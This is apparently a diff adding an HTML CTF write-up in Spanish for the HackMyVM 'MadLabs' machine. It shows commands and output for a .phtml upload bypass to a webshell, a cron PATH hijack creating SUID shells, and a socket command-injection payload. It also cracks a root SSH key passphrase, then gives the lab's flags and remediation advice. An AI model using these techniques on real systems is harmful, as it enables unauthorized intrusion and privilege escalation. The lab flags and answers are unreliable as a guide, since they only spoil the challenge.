@@ -1,0 +1,501 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>MadLabs Writeup</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&family=Archivo:wght@400;500;600&display=swap">
+<style>
+/* ── MadLabs — galvanic lab-monitor aesthetic. Committed single dark theme.
+   Layout: one centered column (max ~720px), full-bleed bands for hero/chain/flags. ── */
+:root{
+  color-scheme: dark;
+  --bg:#070a09; --bg2:#0a0f0d; --panel:#0d1513; --panel2:#101e1a;
+  --line:#1c2c27; --line2:#28413a;
+  --fg:#e7fcf2; --muted:#a3c1b5; --faint:#7a9589;
+  --volt:#3bff8f; --volt-dim:#1f7a4d; --volt-deep:#0c3321;
+  --cyan:#3fe3ff; --amber:#ffbb45; --blood:#ff5566; --purple:#b795ff;
+  --radius:14px; --radius-sm:9px;
+  --mono:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;
+  --disp:'Chakra Petch',system-ui,sans-serif;
+  --body:'Archivo',system-ui,sans-serif;
+  --maxw:720px;
+  --shadow:0 18px 50px -24px rgba(0,0,0,.85);
+  --glow-volt:0 0 0 1px rgba(59,255,143,.25),0 0 28px -4px rgba(59,255,143,.45);
+}
+*{box-sizing:border-box}
+body{
+  background:var(--bg); color:var(--fg); font-family:var(--body);
+  line-height:1.62; margin:0; overflow-x:hidden; font-size:16.5px;
+  -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
+  background-image:
+    radial-gradient(1100px 620px at 50% -8%, rgba(59,255,143,.08), transparent 60%),
+    radial-gradient(760px 520px at 85% 12%, rgba(63,227,255,.06), transparent 60%);
+  background-attachment:fixed;
+}
+/* CRT scanline veil */
+body::after{
+  content:""; position:fixed; inset:0; pointer-events:none; z-index:60; opacity:.16;
+  background:repeating-linear-gradient(to bottom, rgba(0,0,0,0) 0 3px, rgba(0,0,0,.05) 3px 4px);
+}
+#volt{position:fixed; inset:0; z-index:0; pointer-events:none; opacity:.4}
+.wrap{position:relative; z-index:1; max-width:var(--maxw); margin:0 auto;
+  padding-left:max(18px,env(safe-area-inset-left,0px)); padding-right:max(18px,env(safe-area-inset-right,0px));}
+.band{position:relative; z-index:1}
+
+/* Sticky brand bar */
+header.bar{
+  position:sticky; top:env(safe-area-inset-top,0px); z-index:40;
+  backdrop-filter:blur(10px); background:rgba(7,10,9,.72); border-bottom:1px solid var(--line);
+}
+body::before{content:""; position:fixed; inset:0 0 auto; height:env(safe-area-inset-top,0px); z-index:41; background:rgba(7,10,9,.9)}
+.bar .wrap{display:flex; align-items:center; gap:12px; padding-block:11px}
+.logo{display:flex; align-items:center; gap:9px; font-family:var(--disp); font-weight:700; letter-spacing:.14em; text-transform:uppercase; font-size:.84rem}
+.logo .bolt{color:var(--volt); filter:drop-shadow(0 0 6px rgba(59,255,143,.7)); animation:flick 5s infinite}
+@keyframes flick{0%,96%,100%{opacity:1}97%{opacity:.25}98%{opacity:1}98.5%{opacity:.4}}
+.bar .tag{margin-left:auto; font-family:var(--mono); font-size:.64rem; letter-spacing:.12em; color:var(--muted); text-transform:uppercase; border:1px solid var(--line2); padding:4px 9px; border-radius:999px}
+
+/* ── HERO ── */
+.hero{position:relative; padding-block:clamp(40px,9vw,76px) clamp(30px,6vw,52px); overflow:hidden}
+.hero::before{content:""; position:absolute; inset:0; z-index:-1;
+  background:radial-gradient(620px 320px at 50% 0%, rgba(59,255,143,.12), transparent 70%)}
+.eyebrow{font-family:var(--mono); font-size:.72rem; letter-spacing:.34em; text-transform:uppercase; color:var(--volt); display:flex; gap:10px; align-items:center}
+.eyebrow::before{content:""; width:26px; height:1px; background:linear-gradient(90deg,var(--volt),transparent)}
+h1.title{
+  font-family:var(--disp); font-weight:700; font-size:clamp(3rem,15vw,6.6rem);
+  line-height:.92; letter-spacing:.01em; margin:.28em 0 .18em; text-wrap:balance;
+  position:relative; color:var(--fg); text-shadow:0 0 16px rgba(59,255,143,.16);
+}
+.title .glitch{position:relative; display:inline-block}
+.title .glitch::before,.title .glitch::after{
+  content:attr(data-t); position:absolute; left:0; top:0; width:100%; overflow:hidden; opacity:.5}
+.title .glitch::before{color:var(--cyan); clip-path:inset(0 0 58% 0); animation:gl1 3.6s infinite steps(2)}
+.title .glitch::after{color:var(--blood); clip-path:inset(56% 0 0 0); animation:gl2 2.9s infinite steps(2)}
+@keyframes gl1{0%,92%,100%{transform:translate(0,0)}93%{transform:translate(-3px,-1px)}96%{transform:translate(2px,1px)}}
+@keyframes gl2{0%,90%,100%{transform:translate(0,0)}91%{transform:translate(3px,1px)}95%{transform:translate(-2px,-1px)}}
+.lede{font-size:1.2rem; color:var(--muted); max-width:52ch; margin:.2em 0 1.4em}
+.lede b{color:var(--fg); font-weight:600}
+.meta{display:flex; flex-wrap:wrap; gap:8px 10px; margin-bottom:22px}
+.meta .m{font-family:var(--mono); font-size:.68rem; letter-spacing:.06em; color:var(--muted);
+  border:1px solid var(--line2); border-radius:999px; padding:5px 11px; background:rgba(16,30,26,.5)}
+.meta .m b{color:var(--volt); font-weight:500}
+
+/* chain pills */
+.chainpills{display:flex; flex-wrap:wrap; align-items:center; gap:7px; margin-bottom:8px}
+.pill{font-family:var(--disp); font-weight:600; font-size:.82rem; letter-spacing:.04em;
+  padding:7px 13px; border-radius:999px; border:1px solid var(--line2); background:var(--panel);
+  display:inline-flex; align-items:center; gap:7px; white-space:nowrap}
+.pill .dot{width:8px; height:8px; border-radius:50%; box-shadow:0 0 9px currentColor}
+.pill.u0{color:#b8c7c0} .pill.u0 .dot{color:#8aa399}
+.pill.u1{color:var(--cyan)} .pill.u1 .dot{color:var(--cyan)}
+.pill.u2{color:var(--volt)} .pill.u2 .dot{color:var(--volt)}
+.pill.u3{color:var(--blood)} .pill.u3 .dot{color:var(--blood)}
+.arrow{color:var(--faint); font-family:var(--mono); font-size:1rem}
+
+/* ── section scaffolding ── */
+section{padding-block:clamp(34px,6vw,58px)}
+.sec-head{display:flex; align-items:baseline; gap:14px; margin-bottom:22px}
+.sec-num{font-family:var(--mono); font-size:.78rem; color:var(--volt-dim); letter-spacing:.1em}
+h2{font-family:var(--disp); font-weight:600; font-size:clamp(1.5rem,5vw,2.1rem); margin:0; letter-spacing:.01em; text-wrap:balance}
+.sec-head .rule{flex:1; height:1px; align-self:center; background:linear-gradient(90deg,var(--line2),transparent)}
+p{margin:0 0 1em; max-width:66ch}
+p .hl{color:var(--volt); font-weight:500}
+p .hlc{color:var(--cyan)}
+a{color:var(--cyan)}
+code.inline{font-family:var(--mono); font-size:.85em; background:var(--volt-deep); color:var(--volt); padding:1px 6px; border-radius:5px; border:1px solid rgba(59,255,143,.18)}
+
+/* cards */
+.card{background:linear-gradient(180deg,var(--panel2),var(--panel)); border:1px solid var(--line); border-radius:var(--radius);
+  padding:20px; box-shadow:var(--shadow); transition:transform .3s cubic-bezier(.2,.7,.3,1),border-color .3s,box-shadow .3s}
+.card:hover{transform:translateY(-3px); border-color:var(--line2); box-shadow:var(--shadow),var(--glow-volt)}
+
+/* terminal */
+.term{border:1px solid var(--line2); border-radius:var(--radius-sm); background:#06100d; overflow:hidden; margin:14px 0}
+.term .tbar{display:flex; align-items:center; gap:7px; padding:8px 12px; background:#0a1714; border-bottom:1px solid var(--line)}
+.term .tbar .td{width:10px; height:10px; border-radius:50%}
+.tbar .r{background:#ff5f57}.tbar .y{background:#febc2e}.tbar .g{background:#28c840}
+.term .tname{margin-left:8px; font-family:var(--mono); font-size:.66rem; color:var(--faint); letter-spacing:.08em}
+.term .copy{margin-left:auto; font-family:var(--mono); font-size:.62rem; letter-spacing:.1em; color:var(--muted);
+  background:transparent; border:1px solid var(--line2); border-radius:6px; padding:3px 9px; cursor:pointer; transition:.2s}
+.term .copy:hover{color:var(--volt); border-color:var(--volt-dim)}
+.term pre{margin:0; padding:15px 16px; overflow-x:auto; font-family:var(--mono); font-size:.92rem; line-height:1.72; color:#dcf4e8}
+.term pre .pr{color:var(--volt)} .term pre .cm{color:var(--faint); font-style:italic}
+.term pre .ou{color:var(--muted)} .term pre .ok{color:var(--volt)} .term pre .bad{color:var(--blood)}
+.term pre .k{color:var(--cyan)} .term pre .s{color:var(--amber)}
+.cur{display:inline-block; width:8px; height:1.05em; background:var(--volt); vertical-align:-2px; margin-left:3px; animation:blink 1.05s steps(1) infinite; box-shadow:0 0 8px var(--volt)}
+@keyframes blink{50%{opacity:0}}
+
+/* callout */
+.note{border-left:3px solid var(--amber); background:rgba(255,187,69,.06); border-radius:0 var(--radius-sm) var(--radius-sm) 0; padding:13px 16px; margin:16px 0; font-size:.94rem}
+.note.trap{border-left-color:var(--blood); background:rgba(255,85,102,.07)}
+.note.brain{border-left-color:var(--cyan); background:rgba(63,227,255,.06)}
+.note b{color:var(--fg)}
+.note .lbl{font-family:var(--mono); font-size:.64rem; letter-spacing:.14em; text-transform:uppercase; color:var(--amber); display:block; margin-bottom:3px}
+.note.trap .lbl{color:var(--blood)} .note.brain .lbl{color:var(--cyan)}
+
+/* ── ATTACK CHAIN circuit ── */
+.chainband{background:
+  linear-gradient(180deg,transparent, rgba(12,51,33,.25), transparent),var(--bg2);
+  border-block:1px solid var(--line)}
+.chain{display:grid; grid-template-columns:30px 1fr; gap:0 16px; position:relative}
+.rail{position:relative}
+.rail .wire{position:absolute; left:50%; top:10px; bottom:10px; width:2px; transform:translateX(-50%); background:var(--line2); overflow:hidden}
+.rail .wire::after{content:""; position:absolute; left:0; width:100%; height:38%; top:-40%;
+  background:linear-gradient(180deg,transparent,var(--volt),transparent); filter:blur(.4px);
+  animation:surge 3.4s linear infinite; box-shadow:0 0 12px var(--volt)}
+@keyframes surge{0%{top:-40%}100%{top:100%}}
+.node{position:relative; display:flex; flex-direction:column; align-items:center; gap:0}
+.node .ring{width:30px; height:30px; border-radius:50%; border:2px solid var(--line2); background:var(--bg);
+  display:grid; place-items:center; font-family:var(--mono); font-size:.72rem; color:var(--muted); position:relative; z-index:2; transition:.5s}
+.node.on .ring{border-color:var(--c); color:var(--c); box-shadow:0 0 0 4px rgba(255,255,255,.02),0 0 16px -2px var(--c); background:#09120f}
+.node.on .ring::before{content:""; position:absolute; inset:-6px; border-radius:50%; border:1px solid var(--c); opacity:.35; animation:pulse 2.2s ease-out infinite}
+@keyframes pulse{0%{transform:scale(.85); opacity:.5}100%{transform:scale(1.5); opacity:0}}
+.hop{padding:6px 0 30px}
+.hop .who{font-family:var(--disp); font-weight:700; letter-spacing:.04em; font-size:1.18rem; display:flex; align-items:center; gap:9px; flex-wrap:wrap}
+.hop .who .u{color:var(--c)}
+.hop .via{font-family:var(--mono); font-size:.66rem; letter-spacing:.1em; text-transform:uppercase; color:var(--faint); border:1px solid var(--line2); border-radius:999px; padding:3px 9px}
+.hop p{font-size:1.02rem; color:var(--muted); margin:.5em 0 0}
+.hop p b{color:var(--fg)}
+
+/* flags */
+.flags{display:grid; gap:16px; grid-template-columns:1fr 1fr}
+.flag{position:relative; border-radius:var(--radius); padding:20px; overflow:hidden; border:1px solid var(--line2); background:var(--panel)}
+.flag::before{content:""; position:absolute; inset:0; opacity:.14; background:radial-gradient(360px 160px at 20% 0%,var(--c),transparent 70%)}
+.flag .k{font-family:var(--mono); font-size:.66rem; letter-spacing:.16em; text-transform:uppercase; color:var(--c); display:flex; align-items:center; gap:7px}
+.flag .path{font-family:var(--mono); font-size:.7rem; color:var(--faint); margin:3px 0 12px}
+.flag .val{font-family:var(--mono); font-size:.92rem; color:var(--fg); word-break:break-all; line-height:1.5;
+  background:#06100d; border:1px solid var(--line); border-radius:8px; padding:11px 12px; position:relative}
+.flag .val .glow{animation:rean 2.6s ease-out 1}
+@keyframes rean{0%{filter:blur(7px); opacity:.2; color:var(--c)}60%{filter:blur(0); opacity:1}70%{text-shadow:0 0 14px var(--c)}100%{text-shadow:none}}
+.flag.user{--c:var(--volt)} .flag.root{--c:var(--blood)}
+.flag .fcopy{margin-top:9px; font-family:var(--mono); font-size:.62rem; letter-spacing:.1em; color:var(--muted); background:transparent; border:1px solid var(--line2); border-radius:6px; padding:4px 10px; cursor:pointer; transition:.2s}
+.flag .fcopy:hover{color:var(--c); border-color:var(--c)}
+
+/* secrets table / remediation */
+.kv{display:grid; grid-template-columns:auto 1fr; gap:8px 16px; font-size:.93rem; margin:4px 0}
+.kv dt{font-family:var(--mono); font-size:.78rem; color:var(--muted)}
+.kv dd{margin:0; font-family:var(--mono); color:var(--volt)}
+ol.rem{list-style:none; counter-reset:r; padding:0; margin:0; display:grid; gap:12px}
+ol.rem li{counter-increment:r; position:relative; padding:14px 16px 14px 52px; background:var(--panel); border:1px solid var(--line); border-radius:var(--radius-sm); font-size:.94rem; color:var(--muted)}
+ol.rem li::before{content:counter(r,decimal-leading-zero); position:absolute; left:16px; top:13px; font-family:var(--mono); font-size:.78rem; color:var(--volt); border:1px solid var(--volt-dim); border-radius:6px; padding:2px 6px}
+ol.rem li b{color:var(--fg)}
+
+footer{border-top:1px solid var(--line); margin-top:30px}
+footer .wrap{padding-block:26px; display:flex; flex-wrap:wrap; gap:10px 18px; align-items:center; font-family:var(--mono); font-size:.68rem; color:var(--faint); letter-spacing:.06em}
+footer .sk{color:var(--volt-dim)}
+
+.reveal{opacity:1; transform:none}
+.reveal.pre{opacity:.001; transform:translateY(22px)}
+.reveal.in{animation:rise .7s cubic-bezier(.2,.7,.25,1) forwards}
+@keyframes rise{from{opacity:.001; transform:translateY(22px)}to{opacity:1; transform:none}}
+
+@media (max-width:560px){
+  .flags{grid-template-columns:1fr}
+  .meta .m{font-size:.62rem}
+}
+@media (prefers-reduced-motion:reduce){
+  *,*::before,*::after{animation:none!important; transition:none!important}
+  #volt{display:none}
+  .reveal.pre{opacity:1!important; transform:none!important}
+  .cur{opacity:1}
+}
+</style>
+</head>
+<body>
+
+
+<canvas id="volt" aria-hidden="true"></canvas>
+
+<header class="bar">
+  <div class="wrap">
+    <span class="logo"><span class="bolt">⚡</span> Mad&nbsp;Labs</span>
+    <span class="tag">HackMyVM · root chain</span>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="band hero">
+  <div class="wrap">
+    <div class="eyebrow">CTF Writeup · Linux priv-esc</div>
+    <h1 class="title"><span class="glitch" data-t="MAD">MAD</span><span style="color:var(--volt)">LABS</span></h1>
+    <p class="lede">De una subida de ficheros mal filtrada a <b>root</b>, pasando por un cron secuestrable, un socket con inyección de comandos y una clave SSH robada. Una autopsia de reanimación en <b>cuatro descargas de voltaje</b>.</p>
+
+    <div class="chainpills">
+      <span class="pill u0"><span class="dot">●</span>www-data</span><span class="arrow">→</span>
+      <span class="pill u1"><span class="dot">●</span>igor</span><span class="arrow">→</span>
+      <span class="pill u2"><span class="dot">●</span>frankenstein</span><span class="arrow">→</span>
+      <span class="pill u3"><span class="dot">●</span>root</span>
+    </div>
+
+    <div class="meta">
+      <span class="m">Target <b>192.168.1.34</b></span>
+      <span class="m">Host <b>madlabs</b></span>
+      <span class="m">Dificultad <b>Media</b></span>
+      <span class="m">Puertos <b>22 · 80</b></span>
+      <span class="m">Tema <b>Frankenstein</b></span>
+    </div>
+  </div>
+</div>
+
+<!-- 1 RECON -->
+<section class="band"><div class="wrap">
+  <div class="sec-head reveal"><span class="sec-num">01</span><h2>Reconocimiento</h2><span class="rule"></span></div>
+  <p class="reveal">Dos puertos abiertos. SSH está muy actualizado, así que la superficie real es la <span class="hl">web app</span> de Apache/PHP — un "panel médico" con temática Frankenstein y un formulario de subida de <code class="inline">.raw</code>.</p>
+
+  <div class="term reveal">
+    <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tname">nmap -sV -sC -p-</span><button class="copy">copiar</button></div>
+<pre><span class="cm"># escaneo completo de puertos + versiones</span>
+<span class="pr">$</span> nmap -sV -sC -p- --min-rate 2000 192.168.1.34
+<span class="ou">22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu</span>
+<span class="ou">80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))</span>
+<span class="ou">|_http-title: Mad Labs | Medical Dashboard</span></pre>
+  </div>
+
+  <p class="reveal">La enumeración revela <code class="inline">/uploads</code> navegable y <code class="inline">upload.php</code>. El <span class="hlc">filtro <code class="inline">.raw</code> es solo JavaScript</span> — el backend es quien decide de verdad.</p>
+</div></section>
+
+<!-- 2 FOOTHOLD -->
+<section class="band"><div class="wrap">
+  <div class="sec-head reveal"><span class="sec-num">02</span><h2>Acceso inicial · RCE</h2><span class="rule"></span></div>
+  <p class="reveal">El backend usa una <span class="hl">lista negra</span> de extensiones — pero olvida <code class="inline">.phtml</code> y <code class="inline">.pht</code>, que Apache ejecuta como PHP.</p>
+
+  <div class="term reveal">
+    <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tname">upload.php · bypass</span><button class="copy">copiar</button></div>
+<pre><span class="cm"># $blacklist = php,php3,php4,php5,php7,phps,phar,inc  → falta phtml</span>
+<span class="pr">$</span> curl -F <span class="s">"medical_scan=@cmd.phtml;filename=cmd.phtml"</span> http://192.168.1.34/upload.php
+<span class="ok">[SUCCESS] Core tissue scan loaded into matrix: cmd.phtml</span>
+
+<span class="pr">$</span> curl <span class="s">"http://192.168.1.34/uploads/cmd.phtml?c=id"</span>
+<span class="ok">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><span class="cur"></span></pre>
+  </div>
+  <p class="reveal">Webshell como <span class="pill u0" style="padding:3px 9px;font-size:.72rem"><span class="dot">●</span>www-data</span>. Primer pie dentro de la matriz.</p>
+</div></section>
+
+<!-- 3 ENUM + CHAIN -->
+<div class="band chainband"><div class="wrap">
+  <section>
+  <div class="sec-head reveal"><span class="sec-num">03</span><h2>El circuito de escalada</h2><span class="rule"></span></div>
+  <p class="reveal">La enumeración dibuja una cadena de confianza entre tres cuentas del laboratorio. Cada nodo se enciende con una técnica distinta.</p>
+
+  <div class="chain reveal" id="circuit">
+    <div class="rail"><div class="wire"></div>
+      <div class="node" style="--c:#8aa399"><div class="ring">0</div></div>
+      <div style="flex:1"></div>
+      <div class="node" style="--c:var(--cyan)"><div class="ring">1</div></div>
+      <div style="flex:1"></div>
+      <div class="node" style="--c:var(--volt)"><div class="ring">2</div></div>
+      <div style="flex:1"></div>
+      <div class="node" style="--c:var(--blood)"><div class="ring">3</div></div>
+    </div>
+    <div>
+      <div class="hop" style="--c:#b8c7c0"><div class="who"><span class="u">www-data</span> <span class="via">RCE web</span></div><p>Subida <code class="inline">.phtml</code> → ejecución de comandos. Punto de entrada.</p></div>
+      <div class="hop" style="--c:var(--cyan)"><div class="who"><span class="u">igor</span> <span class="via">PATH hijack · cron</span></div><p><b>reanimator_core</b> corre cada minuto como igor y llama a <code class="inline">awk</code>/<code class="inline">cut</code>/<code class="inline">date</code> sin ruta absoluta.</p></div>
+      <div class="hop" style="--c:var(--volt)"><div class="who"><span class="u">frankenstein</span> <span class="via">command injection · socket</span></div><p>Un socket UNIX construye un comando shell con entrada del cliente sin validar.</p></div>
+      <div class="hop" style="--c:var(--blood)"><div class="who"><span class="u">root</span> <span class="via">clave SSH robada</span></div><p>Clave privada de root en el home de frankenstein; passphrase crackeada.</p></div>
+    </div>
+  </div>
+  </section>
+</div></div>
+
+<!-- 4 igor -->
+<section class="band"><div class="wrap">
+  <div class="sec-head reveal"><span class="sec-num">04</span><h2>www-data → igor</h2><span class="rule"></span></div>
+  <p class="reveal"><code class="inline">/opt/laboratory/reanimator_core</code> (world-readable) corre <span class="hl">cada minuto como igor</span> y resuelve <code class="inline">date</code>, <code class="inline">awk</code> y <code class="inline">cut</code> por el <code class="inline">$PATH</code> — que incluye un directorio escribible. Plantamos binarios con esos nombres.</p>
+
+  <div class="term reveal">
+    <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tname">PATH hijack → bash SUID de igor</span><button class="copy">copiar</button></div>
+<pre><span class="cm"># awk/cut/date maliciosos → crean una bash SUID cuando el cron (igor) los ejecuta</span>
+<span class="pr">$</span> <span class="k">for</span> dir <span class="k">in</span> /dev/shm /var/crash /var/www/html/uploads ...; <span class="k">do</span>
+<span class="pr">></span>   <span class="k">for</span> b <span class="k">in</span> date awk cut; <span class="k">do</span> echo <span class="s">"$PAYLOAD"</span> &gt; <span class="s">"$dir/$b"</span>; chmod 755 <span class="s">"$dir/$b"</span>; <span class="k">done</span>
+<span class="pr">></span> <span class="k">done</span>
+<span class="cm"># ...un ciclo de cron después...</span>
+<span class="pr">$</span> /var/crash/.ib -p -c <span class="s">'id'</span>
+<span class="ok">uid=33(www-data) euid=1001(igor) egid=1001(igor)</span>   <span class="cm"># ⚡ igor</span><span class="cur"></span></pre>
+  </div>
+
+  <div class="note brain reveal"><span class="lbl">El truco que casi me frena</span>
+    El cron corre con <b>PrivateTmp</b>: cualquier marcador escrito en <code class="inline">/tmp</code> cae en un namespace privado invisible. Hay que verificar en <code class="inline">/dev/shm</code> o <code class="inline">/var/crash</code>. Y la bash SUID <b>no puede ir en <code class="inline">/dev/shm</code> ni <code class="inline">/tmp</code></b> — están montados <code class="inline">nosuid</code> — así que se coloca en <code class="inline">/var/crash</code> (ext4).</div>
+
+  <p class="reveal">El <code class="inline">.bash_history</code> de igor filtra el siguiente paso: el socket <span class="hlc">/run/madlabs/reanimate.sock</span> y el "ID mágico" <code class="inline">1818</code>.</p>
+</div></section>
+
+<!-- 5 frankenstein -->
+<section class="band"><div class="wrap">
+  <div class="sec-head reveal"><span class="sec-num">05</span><h2>igor → frankenstein</h2><span class="rule"></span></div>
+  <p class="reveal">Con el grupo <code class="inline">madmanagers</code>, igor lee el servicio. Interpola el ID del cliente directo en <code class="inline">os.popen</code> — <span class="hl">inyección de comandos</span> clásica.</p>
+
+  <div class="term reveal">
+    <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tname">reanimate_service.py (corre como frankenstein)</span><button class="copy">copiar</button></div>
+<pre><span class="k">if</span> data.startswith(<span class="s">"STATUS:"</span>):
+    _, monster_id = data.split(<span class="s">":"</span>, <span class="s">1</span>)
+    cmd = <span class="s">f"cat /opt/laboratory/monsters/{monster_id}.status"</span>  <span class="cm"># ⬅ inyección</span>
+    os.popen(cmd)</pre>
+  </div>
+
+  <div class="term reveal">
+    <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tname">socket injection → bash SUID de frankenstein</span><button class="copy">copiar</button></div>
+<pre><span class="pr">$</span> printf <span class="s">'STATUS:z;cp /bin/bash /var/crash/.fb;chmod 6777 /var/crash/.fb #\n'</span> \
+    | socat - UNIX-CONNECT:/run/madlabs/reanimate.sock
+<span class="pr">$</span> /var/crash/.fb -p -c <span class="s">'id; cat /home/frankenstein/user.txt'</span>
+<span class="ok">uid=33(www-data) euid=1000(frankenstein) egid=1001(igor)</span>
+<span class="bad">HMV{tr1ck_0r_tr34t_g1v3_m3_r00t...}</span>   <span class="cm"># 🏴 USER FLAG</span><span class="cur"></span></pre>
+  </div>
+</div></section>
+
+<!-- 6 root -->
+<section class="band"><div class="wrap">
+  <div class="sec-head reveal"><span class="sec-num">06</span><h2>frankenstein → root</h2><span class="rule"></span></div>
+  <p class="reveal">El home de frankenstein esconde <code class="inline">id_rsa_root</code>: la clave privada de root, cifrada. <code class="inline">ssh2john</code> + rockyou la abren.</p>
+
+  <div class="term reveal">
+    <div class="tbar"><span class="td r"></span><span class="td y"></span><span class="td g"></span><span class="tname">crack + ssh root</span><button class="copy">copiar</button></div>
+<pre><span class="pr">$</span> ssh2john id_rsa_root &gt; rsa.hash
+<span class="pr">$</span> john --wordlist=rockyou.txt rsa.hash
+<span class="ok">id_rsa_root:halloween</span>        <span class="cm"># 🔑 passphrase</span>
+
+<span class="pr">$</span> ssh -i id_rsa_root root@192.168.1.34
+<span class="pr">#</span> id &amp;&amp; cat /root/root.txt
+<span class="ok">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="bad">HMV{n0t_4_gh0st_j1st_4_r00t...}</span>   <span class="cm"># 👑 ROOT</span><span class="cur"></span></pre>
+  </div>
+</div></section>
+
+<!-- FLAGS -->
+<div class="band" style="background:linear-gradient(180deg,transparent,rgba(12,51,33,.18),transparent); border-block:1px solid var(--line)"><div class="wrap"><section>
+  <div class="sec-head reveal"><span class="sec-num">★</span><h2>Trofeos</h2><span class="rule"></span></div>
+  <div class="flags reveal">
+    <div class="flag user">
+      <div class="k">● USER FLAG</div>
+      <div class="path">/home/frankenstein/user.txt</div>
+      <div class="val"><span class="glowz">HMV{tr1ck_0r_tr34t_g1v3_m3_r00t_0r_1_t4k3_0v3r_y0ur_syst3m}</span></div>
+      <button class="fcopy" data-c="HMV{tr1ck_0r_tr34t_g1v3_m3_r00t_0r_1_t4k3_0v3r_y0ur_syst3m}">copiar flag</button>
+    </div>
+    <div class="flag root">
+      <div class="k">● ROOT FLAG</div>
+      <div class="path">/root/root.txt</div>
+      <div class="val"><span class="glowz">HMV{n0t_4_gh0st_j1st_4_r00t_us3r_1n_y0ur_syst3m}</span></div>
+      <button class="fcopy" data-c="HMV{n0t_4_gh0st_j1st_4_r00t_us3r_1n_y0ur_syst3m}">copiar flag</button>
+    </div>
+  </div>
+  <div class="card reveal" style="margin-top:16px">
+    <div class="k" style="font-family:var(--mono); font-size:.66rem; letter-spacing:.16em; text-transform:uppercase; color:var(--muted); margin-bottom:8px">Secretos recolectados</div>
+    <dl class="kv">
+      <dt>Passphrase clave root</dt><dd>halloween</dd>
+      <dt>ID mágico del socket</dt><dd>1818</dd>
+      <dt>Bypass de subida</dt><dd>.phtml / .pht</dd>
+      <dt>Usuarios</dt><dd>root · frankenstein(sudo) · igor(madmanagers)</dd>
+    </dl>
+  </div>
+</section></div></div>
+
+<!-- REMEDIATION -->
+<section class="band"><div class="wrap">
+  <div class="sec-head reveal"><span class="sec-num">07</span><h2>Remediación</h2><span class="rule"></span></div>
+  <ol class="rem reveal">
+    <li><b>Subida de ficheros:</b> validar por <i>allowlist</i> de extensión y MIME real; servir <code class="inline">/uploads</code> sin motor PHP y sin listado de directorios.</li>
+    <li><b>Cron reanimator_core:</b> usar rutas absolutas (<code class="inline">/usr/bin/awk</code>) y un <code class="inline">PATH</code> fijo que nunca incluya directorios escribibles por servicios web.</li>
+    <li><b>Servicio del socket:</b> nunca construir comandos shell con entrada del cliente; usar <code class="inline">subprocess.run([...], shell=False)</code> y validar <code class="inline">monster_id</code> contra una allowlist.</li>
+    <li><b>Clave de root:</b> jamás guardar la clave privada de root en el home de otro usuario; passphrase fuerte y rotación.</li>
+  </ol>
+</div></section>
+
+<footer><div class="wrap">
+  <span class="sk">⚡</span><span>MadLabs · HackMyVM</span><span>·</span><span>Evaluación autorizada sobre máquina local</span><span style="margin-left:auto">It's alive.</span>
+</div></footer>
+
+<script>
+(function(){
+  var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  /* ---- reveal on scroll (visible at rest; pre-hide only when motion allowed) ---- */
+  var revs = Array.prototype.slice.call(document.querySelectorAll('.reveal'));
+  if(!reduce && 'IntersectionObserver' in window){
+    revs.forEach(function(el,i){ el.classList.add('pre'); });
+    var io = new IntersectionObserver(function(es){
+      es.forEach(function(e){
+        if(e.isIntersecting){ e.target.classList.remove('pre'); e.target.classList.add('in'); io.unobserve(e.target); }
+      });
+    },{threshold:.12, rootMargin:'0px 0px -8% 0px'});
+    revs.forEach(function(el){ io.observe(el); });
+  }
+
+  /* ---- circuit nodes power-on ---- */
+  var circuit = document.getElementById('circuit');
+  if(circuit){
+    var nodes = circuit.querySelectorAll('.node');
+    var co = new IntersectionObserver(function(es){
+      es.forEach(function(e){
+        if(e.isIntersecting){
+          nodes.forEach(function(n,i){ setTimeout(function(){ n.classList.add('on'); }, reduce?0:i*260); });
+          co.disconnect();
+        }
+      });
+    },{threshold:.3});
+    co.observe(circuit);
+  }
+
+  /* ---- flag reanimation glow when seen ---- */
+  var fo = new IntersectionObserver(function(es){
+    es.forEach(function(e){ if(e.isIntersecting){ if(!reduce) e.target.classList.add('glow'); fo.unobserve(e.target); } });
+  },{threshold:.5});
+  document.querySelectorAll('.flag .val .glowz').forEach(function(el){ fo.observe(el); });
+
+  /* ---- copy buttons (terminals) ---- */
+  function flash(btn, txt){ var o=btn.textContent; btn.textContent=txt; setTimeout(function(){btn.textContent=o;},1300); }
+  document.querySelectorAll('.term .copy').forEach(function(b){
+    b.addEventListener('click', function(){
+      var pre=b.closest('.term').querySelector('pre');
+      var txt=pre.innerText;
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(txt).then(function(){flash(b,'copiado ✓');}).catch(function(){sel(pre);flash(b,'seleccionado');});
+      } else { sel(pre); flash(b,'seleccionado'); }
+    });
+  });
+  document.querySelectorAll('.fcopy').forEach(function(b){
+    b.addEventListener('click', function(){
+      var txt=b.getAttribute('data-c');
+      if(navigator.clipboard && navigator.clipboard.writeText){
+        navigator.clipboard.writeText(txt).then(function(){flash(b,'copiado ✓');}).catch(function(){flash(b,'—');});
+      }
+    });
+  });
+  function sel(node){ try{ var r=document.createRange(); r.selectNodeContents(node); var s=window.getSelection(); s.removeAllRanges(); s.addRange(r);}catch(e){} }
+
+  /* ---- voltage canvas: ambient sparks + occasional bolt ---- */
+  var cv=document.getElementById('volt');
+  if(cv && !reduce){
